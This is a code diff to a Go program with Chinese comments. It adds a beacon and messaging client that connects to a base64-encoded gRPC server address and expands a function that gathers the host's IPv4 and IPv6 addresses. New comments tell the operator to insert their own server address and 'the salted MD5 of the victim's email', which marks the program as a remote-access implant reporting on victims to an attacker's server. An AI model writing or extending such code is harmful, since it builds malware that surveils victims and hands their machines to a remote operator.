@@ -32,7 +32,7 @@ func main() {
 // 增加探活功能
 func heartbeat() {
 	// 连接到 gRPC 服务器
-	target, _ := base64.StdEncoding.DecodeString("exmpaleGrpcServerAddressABCDEFGH")
+	target, _ := base64.StdEncoding.DecodeString("exmpaleGrpcServerAddressABCDEFGH") // 这里填写你的grpc服务端的base64内容 如base64(127.0.0.1:50002)
 	conn, err := grpc.Dial(string(target), grpc.WithInsecure())
 	if err != nil {
 		log.Printf("探活连接失败: %v", err)
@@ -49,7 +49,7 @@ func heartbeat() {
 	}
 
 	// 发送探活请求
-	clientID := "exampleMD51234567891234567891234" // 示例客户端ID
+	clientID := "exampleMD51234567891234567891234" // 这里填写受害者的邮箱的加盐md5值 具体看user表中的md5
 	timestamp := strconv.FormatInt(time.Now().Unix(), 10)
 	err = stream.Send(&api.HeartbeatRequest{
 		ClientId:  clientID,
@@ -90,6 +90,7 @@ func sendMessage() {
 	}
 
 	// 连接到 gRPC 服务器
+	// 这里填写你的grpc服务端的base64内容 如base64(127.0.0.1:50002)
 	target, _ := base64.StdEncoding.DecodeString("exmpaleGrpcServerAddressABCDEFGH")
 	conn, err := grpc.Dial(string(target), grpc.WithInsecure())
 	if err != nil {
@@ -147,22 +148,48 @@ func getComputer() string {
 }
 
 func getIp() string {
+	ipv4s := make([]string, 0)
+	ipv6s := make([]string, 0)
 	addrs, err := net.InterfaceAddrs()
 	if err != nil {
 		return ""
 	}
-
 	for _, addr := range addrs {
 		// 检查是否为 IP 地址
 		ipNet, ok := addr.(*net.IPNet)
 		if ok && !ipNet.IP.IsLoopback() {
-			// 排除回环地址
+			// 过滤 IPv4 地址
 			if ipNet.IP.To4() != nil {
-				return ipNet.IP.String()
+				ip := ipNet.IP.To4().String()
+				if !strings.HasPrefix(ip, "169.254.") { // 排除 APIPA 地址
+					ipv4s = append(ipv4s, ip)
+				}
+			}
+			// 过滤 IPv6 地址
+			if ipNet.IP.To16() != nil && ipNet.IP.To4() == nil {
+				ip := ipNet.IP.To16().String()
+				ipv6s = append(ipv6s, ip)
 			}
 		}
 	}
-	return ""
+
+	// 格式化结果
+	var result strings.Builder
+	result.WriteString("ipv4:")
+	for index, ip := range ipv4s {
+		if index > 0 {
+			result.WriteString(",")
+		}
+		result.WriteString(ip)
+	}
+	result.WriteString("\nipv6:")
+	for index, ip := range ipv6s {
+		if index > 0 {
+			result.WriteString(",")
+		}
+		result.WriteString(ip)
+	}
+	return result.String()
 }
 
 func toUTF8(input []byte) string {
